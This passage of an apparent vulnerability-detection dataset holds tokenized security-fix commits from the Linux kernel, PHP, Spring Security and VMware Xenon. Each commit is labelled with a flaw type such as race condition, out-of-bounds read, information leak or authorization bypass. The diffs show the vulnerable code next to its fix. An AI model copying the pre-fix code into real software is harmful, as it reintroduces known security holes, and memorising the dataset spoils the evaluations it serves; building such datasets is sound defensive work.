"SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "httpBasic", "(", ").", "and", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "hasRole", "(", "\"", "ADMIN", "\"", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "accessDeniedHandler", "(", "httpStatusServerAccessDeniedHandler", "(", "HttpStatus", ".", "BAD_REQUEST", ")", ")", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "filter", "(", "basicAuthentication", "(", "))", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "admin", "\"", ")", ".", "attributes", "(", "basicAuthenticationCredentials", "(", "\"", "user", "\"", ",", "\"", "password", "\"", "))", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isBadRequest", "(", ");", "}", "private", "ServerAuthenticationEntryPoint", "redirectServerAuthenticationEntryPoint", "(", "String", "location", ")", "{", "return", "new", "RedirectServerAuthenticationEntryPoint", "(", "location", ")", ";", "}", "private", "ServerAccessDeniedHandler", "httpStatusServerAccessDeniedHandler", "(", "HttpStatus", "httpStatus", ")", "{", "return", "new", "HttpStatusServerAccessDeniedHandler", "(", "httpStatus", ")", ";", "}", "}"], "docstring_tokens": ["authorization", "bypass"]}
{"contents": ["keys:", "fix", "race", "with", "concurrent", "install_user_keyrings()", "This", "fixes", ".", "There", "is", "a", "race", "in", "install_user_keyrings()", "that", "can", "cause", "a", "NULL", "pointer", "dereference", "when", "called", "concurrently", "for", "the", "same", "user", "if", "the", "uid", "and", "uid-session", "keyrings", "are", "not", "yet", "created.", "It", "might", "be", "possible", "for", "an", "unprivileged", "user", "to", "trigger", "this", "by", "calling", "keyctl()", "from", "userspace", "in", "parallel", "immediately", "after", "logging", "in.", "Assume", "that", "we", "have", "two", "threads", "both", "executing", "lookup_user_key(),", "both", "looking", "for", "KEY_SPEC_USER_SESSION_KEYRING.", "THREAD", "A", "THREAD", "B", "===============================", "===============================", "==>call", "install_user_keyrings();", "if", "(!cred->user->session_keyring)", "==>call", "install_user_keyrings()", "...", "user->uid_keyring", "=", "uid_keyring;", "if", "(user->uid_keyring)", "return", "0;", "<==", "key", "=", "cred->user->session_keyring", "[==", "NULL]", "user->session_keyring", "=", "session_keyring;", "atomic_inc(&key->usage);", "[oops]", "At", "the", "point", "thread", "A", "dereferences", "cred->user->session_keyring,", "thread", "B", "hasn't", "updated", "user->session_keyring", "yet,", "but", "thread", "A", "assumes", "it", "is", "populated", "because", "install_user_keyrings()", "returned", "ok.", "The", "race", "window", "is", "really", "small", "but", "can", "be", "exploited", "if,", "for", "example,", "thread", "B", "is", "interrupted", "or", "preempted", "after", "initializing", "uid_keyring,", "but", "before", "doing", "setting", "session_keyring.", "This", "couldn't", "be", "reproduced", "on", "a", "stock", "kernel.", "However,", "after", "placing", "systemtap", "probe", "on", "'user->session_keyring", "=", "session_keyring;'", "that", "introduced", "some", "delay,", "the", "kernel", "could", "be", "crashed", "reliably.", "Fix", "this", "by", "checking", "both", "pointers", "before", "deciding", "whether", "to", "return.", "Alternatively,", "the", "test", "could", "be", "done", "away", "with", "entirely", "as", "it", "is", "checked", "inside", "the", "mutex", "-", "but", "since", "the", "mutex", "is", "global,", "that", "may", "not", "be", "the", "best", "way.", "Signed-off-by:", "David", "Howells", "<dhowells@redhat.com>", "Reported-by:", "Mateusz", "Guzik", "<mguzik@redhat.com>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "James", "Morris", "<james.l.morris@oracle.com>"], "code_tokens": ["@", "@", "-", "57", ",", "7", "+", "57", ",", "7", "@", "@", "int", "install_user_keyrings", "(", "void", ")", "kenter", "(", "\"%", "p", "{", "%", "u", "}", "\",", "user", ",", "uid", ")", ";", "if", "(", "user", "-", ">", "uid_keyring", ")", "{", "if", "(", "user", "-", ">", "uid_keyring", "&", "&", "user", "-", ">", "session_keyring", ")", "{", "kleave", "(", "\"", "=", "0", "[", "exist", "]", "\")", ";", "return", "0", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["MFH", "fixed", "bug", "#52784", "(Race", "condition", "when", "handling", "many", "concurrent", "signals)"], "code_tokens": ["@", "@", "-", "88", ",", "6", "+", "88", ",", "8", "@", "@", "(", "CURLOPT_STDERR", ")", ").", "(", "Gustavo", ")", "-", "Fixed", "bug", "#", "52786", "(", "PHP", "should", "reset", "section", "to", "[", "PHP", "]", "after", "ini", "sections", ")", ".", "(", "Fedora", "at", "famillecollet", "dot", "com", ")", "-", "Fixed", "bug", "#", "52784", "(", "Race", "condition", "when", "handling", "many", "concurrent", "signals", ")", ".", "(", "nick", "dot", "telford", "at", "gmail", "dot", "com", ",", "Arnaud", ")", "-", "Fixed", "bug", "#", "52772", "(", "var_dump", "(", ")", "doesn", "'", "t", "check", "for", "the", "existence", "of", "get_class_name", "before", "calling", "it", ")", ".", "(", "Kalle", ",", "Gustavo", ")", "-", "Fixed", "bug", "#", "52744", "(", "cal_days_in_month", "incorrect", "for", "December", "1", "BCE", ")", ".", "@", "@", "-", "887", ",", "7", "+", "887", ",", "7", "@", "@", "PHP_FUNCTION", "(", "pcntl_signal", ")", "zend_hash_index_update", "(", "&", "PCNTL_G", "(", "php_signal_table", ")", ",", "signo", ",", "(", "void", "*", "*)", "&", "handle", ",", "sizeof", "(", "zval", "*", "),", "(", "void", "*", "*)", "&", "dest_handle", ")", ";", "if", "(", "dest_handle", ")", "zval_add_ref", "(", "dest_handle", ")", ";", "if", "(", "php_signal", "(", "signo", ",", "pcntl_signal_handler", ",", "(", "int", ")", "restart_syscalls", ")", "=", "=", "SIG_ERR", ")", "{", "if", "(", "php_signal4", "(", "signo", ",", "pcntl_signal_handler", ",", "(", "int", ")", "restart_syscalls", ",", "1", ")", "=", "=", "SIG_ERR", ")", "{", "PCNTL_G", "(", "last_error", ")", "=", "errno", ";", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Error", "assigning", "signal", "\"", ");", "RETURN_FALSE", ";", "@", "@", "-", "1224", ",", "11", "+", "1224", ",", "19", "@", "@", "void", "pcntl_signal_dispatch", "(", ")", "{", "zval", "*", "param", ",", "*", "*", "handle", ",", "*", "retval", ";", "struct", "php_pcntl_pending_signal", "*", "queue", ",", "*", "next", ";", "sigset_t", "mask", ";", "sigset_t", "old_mask", ";", "TSRMLS_FETCH", "(", ");", "/", "*", "Mask", "all", "signals", "*", "/", "sigfillset", "(", "&", "mask", ")", ";", "sigprocmask", "(", "SIG_BLOCK", ",", "&", "mask", ",", "&", "old_mask", ")", ";", "/", "*", "Bail", "if", "the", "queue", "is", "empty", "or", "if", "we", "are", "already", "playing", "the", "queue", "*", "/", "if", "(", "!", "PCNTL_G", "(", "head", ")", "|", "|", "PCNTL_G", "(", "processing_signal_queue", ")", ")", "if", "(", "!", "PCNTL_G", "(", "head", ")", "|", "|", "PCNTL_G", "(", "processing_signal_queue", ")", ")", "{", "sigprocmask", "(", "SIG_SETMASK", ",", "&", "old_mask", ",", "NULL", ")", ";", "return", ";", "}", "/", "*", "Prevent", "reentrant", "handler", "calls", "*", "/", "PCNTL_G", "(", "processing_signal_queue", ")", "=", "1", ";", "@", "@", "-", "1260", ",", "6", "+", "1268", ",", "9", "@", "@", "void", "pcntl_signal_dispatch", "(", ")", "/", "*", "Re", "-", "enable", "queue", "*", "/", "PCNTL_G", "(", "processing_signal_queue", ")", "=", "0", ";", "/", "*", "return", "signal", "mask", "to", "previous", "state", "*", "/", "sigprocmask", "(", "SIG_SETMASK", ",", "&", "old_mask", ",", "NULL", ")", ";", "}", "@", "@", "-", "22", ",", "11", "+", "22", ",", "15", "@", "@", "/", "*", "php_signal", "using", "sigaction", "is", "derrived", "from", "Advanced", "Programing", "*", "in", "the", "Unix", "Environment", "by", "W", ".", "Richard", "Stevens", "p", "298", ".", "*", "/", "Sigfunc", "*", "php_signal", "(", "int", "signo", ",", "Sigfunc", "*", "func", ",", "int", "restart", ")", "Sigfunc", "*", "php_signal4", "(", "int", "signo", ",", "Sigfunc", "*", "func", ",", "int", "restart", ",", "int", "mask_all", ")", "{", "struct", "sigaction", "act", ",", "oact", ";", "act", ".", "sa_handler", "=", "func", ";", "sigemptyset", "(", "&", "act", ".", "sa_mask", ")", ";", "if", "(", "mask_all", ")", "{", "sigfillset", "(", "&", "act", ".", "sa_mask", ")", ";", "}", "else", "{", "sigemptyset", "(", "&", "act", ".", "sa_mask", ")", ";", "}", "act", ".", "sa_flags", "=", "0", ";", "if", "(", "signo", "=", "=", "SIGALRM", "|", "|", "(", "!", "restart", ")", ")", "{", "#", "ifdef", "SA_INTERRUPT", "@", "@", "-", "43", ",", "6", "+", "47", ",", "11", "@", "@", "Sigfunc", "*", "php_signal", "(", "int", "signo", ",", "Sigfunc", "*", "func", ",", "int", "restart", ")", "return", "oact", ".", "sa_handler", ";", "}", "Sigfunc", "*", "php_signal", "(", "int", "signo", ",", "Sigfunc", "*", "func", ",", "int", "restart", ")", "{", "return", "php_signal4", "(", "signo", ",", "func", ",", "restart", ",", "0", ")", ";", "}", "/", "*", "*", "Local", "variables", ":", "*", "tab", "-", "width", ":", "4", "@", "@", "-", "31", ",", "5", "+", "31", ",", "6", "@", "@", "typedef", "void", "Sigfunc", "(", "int", ")", ";", "Sigfunc", "*", "php_signal", "(", "int", "signo", ",", "Sigfunc", "*", "func", ",", "int", "restart", ")", ";", "Sigfunc", "*", "php_signal4", "(", "int", "signo", ",", "Sigfunc", "*", "func", ",", "int", "restart", ",", "int", "mask_all", ")", ";", "#", "endif"], "docstring_tokens": ["race", "condition"]}
{"contents": ["netfilter:", "x_tables:", "make", "sure", "e->next_offset", "covers", "remaining", "blob", "size", "Otherwise", "this", "function", "may", "read", "data", "beyond", "the", "ruleset", "blob.", "Signed-off-by:", "Florian", "Westphal", "<fw@strlen.de>", "Signed-off-by:", "Pablo", "Neira", "Ayuso", "<pablo@netfilter.org>"], "code_tokens": ["@", "@", "-", "573", ",", "7", "+", "573", ",", "8", "@", "@", "static", "inline", "int", "check_entry_size_and_hooks", "(", "struct", "arpt_entry", "*", "e", ",", "int", "err", ";", "if", "(", "(", "unsigned", "long", ")", "e", "%", "__alignof__", "(", "struct", "arpt_entry", ")", "!", "=", "0", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "arpt_entry", ")", ">", "=", "limit", ")", "{", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "arpt_entry", ")", ">", "=", "limit", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "e", "-", ">", "next_offset", ">", "limit", ")", "{", "duprintf", "(", "\"", "Bad", "offset", "%", "p", "\\", "n", "\"", ",", "e", ")", ";", "return", "-", "EINVAL", ";", "}", "@", "@", "-", "1232", ",", "7", "+", "1233", ",", "8", "@", "@", "check_compat_entry_size_and_hooks", "(", "struct", "compat_arpt_entry", "*", "e", ",", "duprintf", "(", "\"", "check_compat_entry_size_and_hooks", "%", "p", "\\", "n", "\"", ",", "e", ")", ";", "if", "(", "(", "unsigned", "long", ")", "e", "%", "__alignof__", "(", "struct", "compat_arpt_entry", ")", "!", "=", "0", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "compat_arpt_entry", ")", ">", "=", "limit", ")", "{", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "compat_arpt_entry", ")", ">", "=", "limit", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "e", "-", ">", "next_offset", ">", "limit", ")", "{", "duprintf", "(", "\"", "Bad", "offset", "%", "p", ",", "limit", "=", "%", "p", "\\", "n", "\"", ",", "e", ",", "limit", ")", ";", "return", "-", "EINVAL", ";", "}", "@", "@", "-", "738", ",", "7", "+", "738", ",", "8", "@", "@", "check_entry_size_and_hooks", "(", "struct", "ipt_entry", "*", "e", ",", "int", "err", ";", "if", "(", "(", "unsigned", "long", ")", "e", "%", "__alignof__", "(", "struct", "ipt_entry", ")", "!", "=", "0", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "ipt_entry", ")", ">", "=", "limit", ")", "{", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "ipt_entry", ")", ">", "=", "limit", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "e", "-", ">", "next_offset", ">", "limit", ")", "{", "duprintf", "(", "\"", "Bad", "offset", "%", "p", "\\", "n", "\"", ",", "e", ")", ";", "return", "-", "EINVAL", ";", "}", "@", "@", "-", "1492", ",", "7", "+", "1493", ",", "8", "@", "@", "check_compat_entry_size_and_hooks", "(", "struct", "compat_ipt_entry", "*", "e", ",", "duprintf", "(", "\"", "check_compat_entry_size_and_hooks", "%", "p", "\\", "n", "\"", ",", "e", ")", ";", "if", "(", "(", "unsigned", "long", ")", "e", "%", "__alignof__", "(", "struct", "compat_ipt_entry", ")", "!", "=", "0", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "compat_ipt_entry", ")", ">", "=", "limit", ")", "{", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "compat_ipt_entry", ")", ">", "=", "limit", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "e", "-", ">", "next_offset", ">", "limit", ")", "{", "duprintf", "(", "\"", "Bad", "offset", "%", "p", ",", "limit", "=", "%", "p", "\\", "n", "\"", ",", "e", ",", "limit", ")", ";", "return", "-", "EINVAL", ";", "}", "@", "@", "-", "750", ",", "7", "+", "750", ",", "8", "@", "@", "check_entry_size_and_hooks", "(", "struct", "ip6t_entry", "*", "e", ",", "int", "err", ";", "if", "(", "(", "unsigned", "long", ")", "e", "%", "__alignof__", "(", "struct", "ip6t_entry", ")", "!", "=", "0", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "ip6t_entry", ")", ">", "=", "limit", ")", "{", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "ip6t_entry", ")", ">", "=", "limit", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "e", "-", ">", "next_offset", ">", "limit", ")", "{", "duprintf", "(", "\"", "Bad", "offset", "%", "p", "\\", "n", "\"", ",", "e", ")", ";", "return", "-", "EINVAL", ";", "}", "@", "@", "-", "1504", ",", "7", "+", "1505", ",", "8", "@", "@", "check_compat_entry_size_and_hooks", "(", "struct", "compat_ip6t_entry", "*", "e", ",", "duprintf", "(", "\"", "check_compat_entry_size_and_hooks", "%", "p", "\\", "n", "\"", ",", "e", ")", ";", "if", "(", "(", "unsigned", "long", ")", "e", "%", "__alignof__", "(", "struct", "compat_ip6t_entry", ")", "!", "=", "0", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "compat_ip6t_entry", ")", ">", "=", "limit", ")", "{", "(", "unsigned", "char", "*", ")", "e", "+", "sizeof", "(", "struct", "compat_ip6t_entry", ")", ">", "=", "limit", "|", "|", "(", "unsigned", "char", "*", ")", "e", "+", "e", "-", ">", "next_offset", ">", "limit", ")", "{", "duprintf", "(", "\"", "Bad", "offset", "%", "p", ",", "limit", "=", "%", "p", "\\", "n", "\"", ",", "e", ",", "limit", ")", ";", "return", "-", "EINVAL", ";", "}"], "docstring_tokens": ["out-of-bounds", "memory", "access"]}
{"contents": ["fbdev:", "Fixing", "arbitrary", "kernel", "leak", "in", "case", "FBIOGETCMAP_SPARC", "in", "sbusfb_ioctl_helper().", "Fixing", "arbitrary", "kernel", "leak", "in", "case", "FBIOGETCMAP_SPARC", "in", "sbusfb_ioctl_helper().", "'index'", "is", "defined", "as", "an", "int", "in", "sbusfb_ioctl_helper().", "We", "retrieve", "this", "from", "the", "user:", "if", "(get_user(index,", "&c->index)", "||", "__get_user(count,", "&c->count)", "||", "__get_user(ured,", "&c->red)", "||", "__get_user(ugreen,", "&c->green)", "||", "__get_user(ublue,", "&c->blue))", "return", "-EFAULT;", "and", "then", "we", "use", "'index'", "in", "the", "following", "way:", "red", "=", "cmap->red[index", "+", "i]", ">>", "8;", "green", "=", "cmap->green[index", "+", "i]", ">>", "8;", "blue", "=", "cmap->blue[index", "+", "i]", ">>", "8;", "This", "is", "a", "classic", "information", "leak", "vulnerability.", "'index'", "should", "be", "an", "unsigned", "int,", "given", "its", "usage", "above.", "This", "patch", "is", "straight-forward;", "it", "changes", "'index'", "to", "unsigned", "int", "in", "two", "switch-cases:", "FBIOGETCMAP_SPARC", "&&", "FBIOPUTCMAP_SPARC.", "This", "patch", "fixes", ".", "Signed-off-by:", "Peter", "Malone", "<peter.malone@gmail.com>", "Acked-by:", "Mathieu", "Malaterre", "<malat@debian.org>", "Signed-off-by:", "Bartlomiej", "Zolnierkiewicz", "<b.zolnierkie@samsung.com>"], "code_tokens": ["@", "@", "-", "122", ",", "7", "+", "122", ",", "7", "@", "@", "int", "sbusfb_ioctl_helper", "(", "unsigned", "long", "cmd", ",", "unsigned", "long", "arg", ",", "unsigned", "char", "__user", "*", "ured", ";", "unsigned", "char", "__user", "*", "ugreen", ";", "unsigned", "char", "__user", "*", "ublue", ";", "int", "index", ",", "count", ",", "i", ";", "unsigned", "int", "index", ",", "count", ",", "i", ";", "if", "(", "get_user", "(", "index", ",", "&", "c", "-", ">", "index", ")", "|", "|", "__get_user", "(", "count", ",", "&", "c", "-", ">", "count", ")", "|", "|", "@", "@", "-", "161", ",", "7", "+", "161", ",", "7", "@", "@", "int", "sbusfb_ioctl_helper", "(", "unsigned", "long", "cmd", ",", "unsigned", "long", "arg", ",", "unsigned", "char", "__user", "*", "ugreen", ";", "unsigned", "char", "__user", "*", "ublue", ";", "struct", "fb_cmap", "*", "cmap", "=", "&", "info", "-", ">", "cmap", ";", "int", "index", ",", "count", ",", "i", ";", "unsigned", "int", "index", ",", "count", ",", "i", ";", "u8", "red", ",", "green", ",", "blue", ";", "if", "(", "get_user", "(", "index", ",", "&", "c", "-", ">", "index", ")", "|", "|"], "docstring_tokens": ["information", "leakage"]}
{"contents": ["Add", "check", "for", "string", "overflow", "to", "all", "string", "add", "operations"], "code_tokens": ["@", "@", "-", "1254", ",", "6", "+", "1254", ",", "10", "@", "@", "ZEND_API", "int", "add_char_to_string", "(", "zval", "*", "result", ",", "const", "zval", "*", "op1", ",", "const", "zval", "*", "op2", ")", "int", "length", "=", "Z_STRLEN_P", "(", "op1", ")", "+", "1", ";", "char", "*", "buf", ";", "if", "(", "UNEXPECTED", "(", "length", "<", "0", ")", ")", "{", "zend_error", "(", "E_ERROR", ",", "\"", "String", "size", "overflow", "\"", ");", "}", "if", "(", "IS_INTERNED", "(", "Z_STRVAL_P", "(", "op1", ")", "))", "{", "buf", "=", "(", "char", "*", ")", "emalloc", "(", "length", "+", "1", ")", ";", "memcpy", "(", "buf", ",", "Z_STRVAL_P", "(", "op1", ")", ",", "Z_STRLEN_P", "(", "op1", ")", ");", "@", "@", "-", "1273", ",", "6", "+", "1277", ",", "9", "@", "@", "ZEND_API", "int", "add_string_to_string", "(", "zval", "*", "result", ",", "const", "zval", "*", "op1", ",", "const", "zval", "*", "op2", "int", "length", "=", "Z_STRLEN_P", "(", "op1", ")", "+", "Z_STRLEN_P", "(", "op2", ")", ";", "char", "*", "buf", ";", "if", "(", "UNEXPECTED", "(", "length", "<", "0", ")", ")", "{", "zend_error", "(", "E_ERROR", ",", "\"", "String", "size", "overflow", "\"", ");", "}", "if", "(", "IS_INTERNED", "(", "Z_STRVAL_P", "(", "op1", ")", "))", "{", "buf", "=", "(", "char", "*", ")", "emalloc", "(", "length", "+", "1", ")", ";", "memcpy", "(", "buf", ",", "Z_STRVAL_P", "(", "op1", ")", ",", "Z_STRLEN_P", "(", "op1", ")", ");"], "docstring_tokens": ["out-of-bounds", "read"]}
{"contents": ["Add", "auth", "to", "UtilityService", "Extend", "auth", "check", "to", "UtiliyService", "endpoints:", "stats,", "config,", "subscription", "Issue:", "VRXEN-5", "Change-Id:", "I52a4b4a42731c244a97f97610dcaddb6837e67fb"], "code_tokens": ["@", "@", "-", "57", ",", "7", "+", "57", ",", "29", "@", "@", "public", "UtilityService", "setParent", "(", "Service", "parent", ")", "{", "@", "Override", "public", "void", "authorizeRequest", "(", "Operation", "op", ")", "{", "op", ".", "complete", "(", ");", "String", "suffix", "=", "UriUtils", ".", "buildUriPath", "(", "UriUtils", ".", "URI_PATH_CHAR", ",", "UriUtils", ".", "getLastPathSegment", "(", "op", ".", "getUri", "(", "))", ");", "/", "/", "allow", "access", "to", "ui", "endpoint", "if", "(", "ServiceHost", ".", "SERVICE_URI_SUFFIX_UI", ".", "equals", "(", "suffix", ")", ")", "{", "op", ".", "complete", "(", ");", "return", ";", "}", "ServiceDocument", "doc", "=", "new", "ServiceDocument", "(", ");", "if", "(", "this", ".", "parent", ".", "getOptions", "(", ").", "contains", "(", "ServiceOption", ".", "FACTORY_ITEM", ")", ")", "{", "doc", ".", "documentSelfLink", "=", "UriUtils", ".", "buildUriPath", "(", "UriUtils", ".", "getParentPath", "(", "this", ".", "parent", ".", "getSelfLink", "(", "))", ",", "suffix", ")", ";", "}", "else", "{", "doc", ".", "documentSelfLink", "=", "UriUtils", ".", "buildUriPath", "(", "this", ".", "parent", ".", "getSelfLink", "(", "),", "suffix", ")", ";", "}", "doc", ".", "documentKind", "=", "Utils", ".", "buildKind", "(", "this", ".", "parent", ".", "getStateType", "(", "))", ";", "if", "(", "getHost", "(", ").", "isAuthorized", "(", "this", ".", "parent", ",", "doc", ",", "op", ")", ")", "{", "op", ".", "complete", "(", ");", "return", ";", "}", "op", ".", "fail", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "}", "@", "Override", "@", "@", "-", "513", ",", "6", "+", "513", ",", "16", "@", "@", "public", "void", "statefulServiceAuthorization", "(", ")", "throws", "Throwable", "{", "}", "))", ";", "this", ".", "host", ".", "testWait", "(", ");", "/", "/", "do", "GET", "on", "factory", "/", "stats", ",", "we", "should", "get", "403", "Operation", "statsGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "ExampleService", ".", "FACTORY_LINK", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "statsGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "/", "/", "do", "GET", "on", "factory", "/", "config", ",", "we", "should", "get", "403", "Operation", "configGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "ExampleService", ".", "FACTORY_LINK", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_CONFIG", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "configGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "/", "/", "Assume", "Jane", "'", "s", "identity", "this", ".", "host", ".", "assumeIdentity", "(", "this", ".", "userServicePath", ")", ";", "/", "/", "add", "docs", "accessible", "by", "jane", "@", "@", "-", "555", ",", "9", "+", "565", ",", "27", "@", "@", "public", "void", "statefulServiceAuthorization", "(", ")", "throws", "Throwable", "{", "/", "/", "reset", "the", "auth", "context", "OperationContext", ".", "setAuthorizationContext", "(", "null", ")", ";", "/", "/", "do", "GET", "on", "utility", "suffixes", "in", "example", "child", "services", ",", "we", "should", "get", "403", "for", "(", "URI", "childUri", ":", "exampleServices", ".", "keySet", "(", "))", "{", "statsGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "childUri", ".", "getPath", "(", ")", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "statsGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "configGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "childUri", ".", "getPath", "(", ")", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_CONFIG", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "configGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "}", "/", "/", "Assume", "Jane", "'", "s", "identity", "through", "header", "auth", "token", "String", "authToken", "=", "generateAuthToken", "(", "this", ".", "userServicePath", ")", ";", "/", "/", "do", "GET", "on", "utility", "suffixes", "in", "example", "child", "services", ",", "we", "should", "get", "200", "for", "(", "URI", "childUri", ":", "exampleServices", ".", "keySet", "(", "))", "{", "statsGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "childUri", ".", "getPath", "(", ")", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ";", "statsGet", ".", "addRequestHeader", "(", "Operation", ".", "REQUEST_AUTH_TOKEN_HEADER", ",", "authToken", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectSuccess", "(", "statsGet", ")", ";", "}", "verifyJaneAccess", "(", "exampleServices", ",", "authToken", ")", ";", "}", "@", "@", "-", "85", ",", "7", "+", "85", ",", "9", "@", "@", "public", "void", "createUsers", "(", ")", "throws", "Throwable", "{", "private", "String", "loginUser", "(", "URI", "hostUri", ")", "throws", "Throwable", "{", "URI", "usersLink", "=", "UriUtils", ".", "buildUri", "(", "hostUri", ",", "UserService", ".", "FACTORY_LINK", ")", ";", "/", "/", "wait", "for", "factory", "availability", "this", ".", "host", ".", "setSystemAuthorizationContext", "(", ");", "this", ".", "host", ".", "waitForReplicatedFactoryServiceAvailable", "(", "usersLink", ")", ";", "this", ".", "host", ".", "resetAuthorizationContext", "(", ");", "String", "basicAuth", "=", "constructBasicAuth", "(", "adminUser", ",", "adminUser", ")", ";", "URI", "loginUri", "=", "UriUtils", ".", "buildUri", "(", "hostUri", ",", "ServiceUriPaths", ".", "CORE_AUTHN_BASIC", ")", ";", "@", "@", "-", "299", ",", "11", "+", "299", ",", "14", "@", "@", "public", "void", "testSubscriptionsWithAuth", "(", ")", "throws", "Throwable", "{", "}", "}", ";", "hostWithAuth", ".", "setSystemAuthorizationContext", "(", ");", "Operation", "subscribe", "=", "Operation", ".", "createPost", "(", "UriUtils", ".", "buildUri", "(", "hostWithAuth", ",", "minimalServiceUUID", ")", ");", "subscribe", ".", "setReferer", "(", "hostWithAuth", ".", "getReferer", "(", "))", ";", "ServiceSubscriber", "subscriber", "=", "new", "ServiceSubscriber", "(", ");", "subscriber", ".", "replayState", "=", "true", ";", "hostWithAuth", ".", "startSubscriptionService", "(", "subscribe", ",", "notifyC", ",", "subscriber", ")", ";", "hostWithAuth", ".", "resetAuthorizationContext", "(", ");", "hostWithAuth", ".", "testWait", "(", "notifyContext", ")", ";", "}", "finally", "{", "if", "(", "hostWithAuth", "!", "=", "null", ")", "{", "@", "@", "-", "14", ",", "8", "+", "14", ",", "12", "@", "@", "package", "com", ".", "vmware", ".", "xenon", ".", "common", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceHost", ".", "SERVICE_URI_SUFFIX_TEMPLATE", ";", "import", "static", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceHost", ".", "SERVICE_URI_SUFFIX_UI", ";", "import", "java", ".", "net", ".", "URI", ";", "import", "java", ".", "util", ".", "EnumSet", ";", "import", "java", ".", "util", ".", "List", ";", "@", "@", "-", "32", ",", "10", "+", "36", ",", "16", "@", "@", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceStats", ".", "TimeSeriesStats", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceStats", ".", "TimeSeriesStats", ".", "AggregationType", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceStats", ".", "TimeSeriesStats", ".", "TimeBin", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "AuthTestUtils", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "TestContext", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "TestRequestSender", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "TestRequestSender", ".", "FailureResponse", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "VerificationHost", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "AuthorizationContextService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ".", "ExampleServiceState", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "MinimalTestService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "QueryTask", ".", "Query", ";", "public", "class", "TestUtilityService", "extends", "BasicReusableHostTestCase", "{", "@", "@", "-", "586", ",", "4", "+", "596", ",", "145", "@", "@", "public", "static", "void", "validateTimeSeriesStat", "(", "ServiceStat", "stat", ",", "long", "expectedBinDura", "assertTrue", "(", "maxAvg", ">", "0", ")", ";", "assertTrue", "(", "countPerMaxAvgBin", ">", "=", "1", ")", ";", "}", "@", "Test", "public", "void", "endpointAuthorization", "(", ")", "throws", "Throwable", "{", "VerificationHost", "host", "=", "VerificationHost", ".", "create", "(", "0", ")", ";", "host", ".", "setAuthorizationService", 